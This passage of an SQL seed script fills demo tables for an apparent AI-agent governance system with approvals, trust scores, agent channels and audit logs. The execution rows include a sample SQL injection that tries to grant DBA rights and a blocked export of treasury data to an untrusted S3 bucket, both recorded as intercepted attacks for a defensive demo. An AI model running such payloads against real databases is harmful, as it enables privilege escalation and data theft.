VALUES ('appr-03', 'REQ-2026-1048', 'agent-finance-01', 'pol-exfil-001', 'End-of-month treasury ledger export to encrypted cold storage', 'Storage::ColdArchive.Treasury', 'routine', 'APPROVED', 42, 'Archive finalized October 2026 general ledger reports to Glacier vault.', 'Verified cold storage bucket matches corporate KMS-encrypted destination ARN.', '42 files', 2);

-- 9. APPROVAL_SIGNATURES
DELETE FROM approval_signatures;
INSERT INTO approval_signatures (id, approval_request_id, reviewer_id, is_signed, ephemeral_lease_ttl_minutes, "comments")
VALUES ('sig-01', 'appr-01', 'user-mvance-01', 1, 30, 'Approved index operation under 30-minute maintenance window lease.');

INSERT INTO approval_signatures (id, approval_request_id, reviewer_id, is_signed, ephemeral_lease_ttl_minutes, "comments")
VALUES ('sig-02', 'appr-01', 'user-anand-01', 0, NULL, 'Pending secondary DevSecOps signature for dual-key quorum.');

INSERT INTO approval_signatures (id, approval_request_id, reviewer_id, is_signed, ephemeral_lease_ttl_minutes, "comments")
VALUES ('sig-03', 'appr-03', 'user-mvance-01', 1, 60, 'Cryptographic lease authorized for financial archive vault.');

INSERT INTO approval_signatures (id, approval_request_id, reviewer_id, is_signed, ephemeral_lease_ttl_minutes, "comments")
VALUES ('sig-04', 'appr-03', 'user-srev-02', 1, 60, 'Audit verification completed. Quorum achieved.');

-- 10. AGENT_TRUST
DELETE FROM agent_trust;
INSERT INTO agent_trust (id, agent_id, current_score, baseline_score, compliance_rate, anomaly_delta, behavioral_state, sigmoid_steepness, decay_half_life_hours)
VALUES ('trust-db-01', 'agent-database-01', 92.0, 95.0, 98.2, 0.02, 'OPTIMAL (Stable)', 1.2, 48.0);

INSERT INTO agent_trust (id, agent_id, current_score, baseline_score, compliance_rate, anomaly_delta, behavioral_state, sigmoid_steepness, decay_half_life_hours)
VALUES ('trust-fin-01', 'agent-finance-01', 88.0, 90.0, 95.8, 0.04, 'NOMINAL (Supervised)', 1.0, 36.0);

INSERT INTO agent_trust (id, agent_id, current_score, baseline_score, compliance_rate, anomaly_delta, behavioral_state, sigmoid_steepness, decay_half_life_hours)
VALUES ('trust-cod-01', 'agent-coding-01', 91.0, 92.0, 97.4, 0.03, 'OPTIMAL (Stable)', 1.1, 40.0);

INSERT INTO agent_trust (id, agent_id, current_score, baseline_score, compliance_rate, anomaly_delta, behavioral_state, sigmoid_steepness, decay_half_life_hours)
VALUES ('trust-res-01', 'agent-research-01', 94.0, 95.0, 99.1, 0.01, 'OPTIMAL (Stable)', 0.9, 72.0);

INSERT INTO agent_trust (id, agent_id, current_score, baseline_score, compliance_rate, anomaly_delta, behavioral_state, sigmoid_steepness, decay_half_life_hours)
VALUES ('trust-red-01', 'agent-redagent-01', 18.0, 50.0, 18.5, 0.89, 'QUARANTINED (Isolated)', 2.5, 4.0);

-- 11. AGENT_TRUST_HISTORY
DELETE FROM agent_trust_history;
INSERT INTO agent_trust_history (id, agent_id, trust_score, score_delta, reason)
VALUES ('th-db-01', 'agent-database-01', 92.0, 1.0, 'Authorized schema query execution verified under QUERY: DB capability.');

INSERT INTO agent_trust_history (id, agent_id, trust_score, score_delta, reason)
VALUES ('th-fin-01', 'agent-finance-01', 88.0, -3.0, 'Stage-Zero policy interception: Unauthorized export attempt flagged.');

INSERT INTO agent_trust_history (id, agent_id, trust_score, score_delta, reason)
VALUES ('th-cod-01', 'agent-coding-01', 91.0, 1.0, 'Continuous integration test execution validated successfully.');

INSERT INTO agent_trust_history (id, agent_id, trust_score, score_delta, reason)
VALUES ('th-res-01', 'agent-research-01', 94.0, 1.0, 'Academic research vector index verified with zero anomalies.');

INSERT INTO agent_trust_history (id, agent_id, trust_score, score_delta, reason)
VALUES ('th-red-01', 'agent-redagent-01', 18.0, -15.0, 'Adversarial SQL injection probe trapped. Severe sigmoid decay applied.');

-- 12. AGENT_COMMUNICATIONS
DELETE FROM agent_communications;
INSERT INTO agent_communications (id, source_agent_id, target_agent_id, channel_title, protocol, state, channel_crypto, risk_score, synthesized_intent, is_severed)
VALUES ('comm-01', 'agent-coding-01', 'agent-database-01', 'Automated Schema Migration Handshake', 'mTLS-Ed25519', 'verified', 'mTLS v1.3 Ed25519', 12, 'Coding agent requests table schema definition for index optimization.', 0);

INSERT INTO agent_communications (id, source_agent_id, target_agent_id, channel_title, protocol, state, channel_crypto, risk_score, synthesized_intent, is_severed)
VALUES ('comm-02', 'agent-finance-01', 'agent-database-01', 'Treasury Reconciliation Query Channel', 'mTLS-Ed25519', 'verified', 'mTLS v1.3 Ed25519', 14, 'Finance agent requests read-only view of October ledger balances.', 0);

INSERT INTO agent_communications (id, source_agent_id, target_agent_id, channel_title, protocol, state, channel_crypto, risk_score, synthesized_intent, is_severed)
VALUES ('comm-03', 'agent-research-01', 'agent-coding-01', 'Academic Patch Synthesis Channel', 'mTLS-Ed25519', 'verified', 'mTLS v1.3 Ed25519', 8, 'Research agent transfers benchmark embeddings for algorithm patch.', 0);

INSERT INTO agent_communications (id, source_agent_id, target_agent_id, channel_title, protocol, state, channel_crypto, risk_score, synthesized_intent, is_severed)
VALUES ('comm-04', 'agent-redagent-01', 'agent-database-01', 'Adversarial Injection Probe Channel', 'Untrusted', 'severed', 'Terminated', 99, 'Adversarial probing attempt detected. Network channel severed at kernel level.', 1);

-- 13. AGENT_EXECUTIONS
DELETE FROM agent_executions;
INSERT INTO agent_executions (id, agent_id, operation, target_resource, raw_payload_snippet, payload_sha256, synthesized_intent, verdict, latency_ms)
VALUES ('exec-01', 'agent-database-01', 'SELECT', 'Oracle::ORCL.agents', 'SELECT id, name, model, role, status FROM agents;', 'a1b2c3d4e5f6...hash', 'Read sovereign agent identities for governance audit.', 'ALLOWED', 142.5);

INSERT INTO agent_executions (id, agent_id, operation, target_resource, raw_payload_snippet, payload_sha256, synthesized_intent, verdict, latency_ms)
VALUES ('exec-02', 'agent-database-01', 'UPDATE', 'Oracle::ORCL.agents', 'UPDATE agents SET last_action = current_time WHERE id = agent-database-01;', 'b2c3d4e5f6a1...hash', 'Update sovereign agent runtime heartbeat timestamp.', 'ALLOWED', 188.2);

INSERT INTO agent_executions (id, agent_id, operation, target_resource, raw_payload_snippet, payload_sha256, synthesized_intent, verdict, latency_ms)
VALUES ('exec-03', 'agent-finance-01', 'EXPORT', 'Storage::S3.Untrusted', 'EXPORT TABLE treasury_reserves TO s3://untrusted/', 'c3d4e5f6a1b2...hash', 'Exfiltration of sensitive treasury reserves detected.', 'BLOCKED', 1.4);

INSERT INTO agent_executions (id, agent_id, operation, target_resource, raw_payload_snippet, payload_sha256, synthesized_intent, verdict, latency_ms)
VALUES ('exec-04', 'agent-redagent-01', 'SQL_INJECTION', 'Oracle::ORCL.sys_dba', '; EXEC dbms_lock.sleep(10); GRANT DBA TO RED_AGENT; --', 'd4e5f6a1b2c3...hash', 'Adversarial SQL injection and privilege escalation attack.', 'BLOCKED', 0.9);

-- 14. AUDIT_LOGS
DELETE FROM audit_logs;
INSERT INTO audit_logs (id, tx_hash, block_number, leaf_index, leaf_hash, parent_root, agent_id, user_id, action_type, target_resource, synthesized_intent, risk_score, applied_policy, decision, enclave_type, pcr0_measurement)
VALUES ('audit-01', '0x9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b', 104829, 'leaf-01', '0x11223344...', '0x99887766...', 'agent-database-01', 'user-mvance-01', 'SQL_QUERY', 'Oracle::ORCL.agents', 'Authorized read execution for sovereign agent audit.', 14, 'POLICY-DB-001-SCOPED-ALLOW', 'ALLOWED', 'AWS Nitro Enclave v2', 'pcr0-sha256-verified-88192');

INSERT INTO audit_logs (id, tx_hash, block_number, leaf_index, leaf_hash, parent_root, agent_id, user_id, action_type, target_resource, synthesized_intent, risk_score, applied_policy, decision, enclave_type, pcr0_measurement)
VALUES ('audit-02', '0x8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9a', 104830, 'leaf-02', '0x22334455...', '0x99887766...', 'agent-database-01', 'user-mvance-01', 'SQL_UPDATE', 'Oracle::ORCL.agents', 'Authorized mutation committed under WRITE: DB scope.', 16, 'POLICY-DB-WRITE-SCOPED-ALLOW', 'ALLOWED', 'AWS Nitro Enclave v2', 'pcr0-sha256-verified-88192');

INSERT INTO audit_logs (id, tx_hash, block_number, leaf_index, leaf_hash, parent_root, agent_id, user_id, action_type, target_resource, synthesized_intent, risk_score, applied_policy, decision, enclave_type, pcr0_measurement)
VALUES ('audit-03', '0x7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9a8b', 104831, 'leaf-03', '0x33445566...', '0x99887766...', 'agent-finance-01', 'user-mvance-01', 'DATA_EGRESS', 'Treasury::Ledger.Export', 'Unauthorized financial exfiltration intercepted at Stage-Zero.', 91, 'POLICY-FIN-EXFIL-001', 'BLOCKED', 'AWS Nitro Enclave v2', 'pcr0-sha256-verified-38472');

INSERT INTO audit_logs (id, tx_hash, block_number, leaf_index, leaf_hash, parent_root, agent_id, user_id, action_type, target_resource, synthesized_intent, risk_score, applied_policy, decision, enclave_type, pcr0_measurement)
VALUES ('audit-04', '0x6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9a8b7c', 104832, 'leaf-04', '0x44556677...', '0x99887766...', 'agent-redagent-01', NULL, 'SQL_INJECTION', 'Oracle::ORCL.sys_dba', 'Adversarial probe intercepted. Agent contained in quarantine sandbox.', 99, 'POLICY-ADVERSARIAL-ISOLATION', 'BLOCKED', 'Isolated Sandbox Enclave', 'pcr0-quarantine-hash-00000');

COMMIT;
EXIT;
